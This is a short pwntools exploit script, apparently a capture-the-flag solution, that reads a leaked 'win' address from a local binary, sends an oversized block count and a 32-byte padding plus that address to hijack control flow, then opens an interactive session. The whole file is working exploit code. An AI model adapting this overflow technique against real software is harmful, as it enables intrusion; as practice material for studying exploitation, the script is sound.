from pwn import *

context.log_level = "DEBUG"

p = process(["./aslrbp", "./1"])

p.recvuntil(b"win:  ")
win = int(p.recvline().strip(), 16)

p.recvuntil(b"How many blocks?")
p.sendline(b"4097")
p.recvuntil(b"Send data:")
payload = b"A"*32 + p64(win)
p.send(payload)

p.interactive()
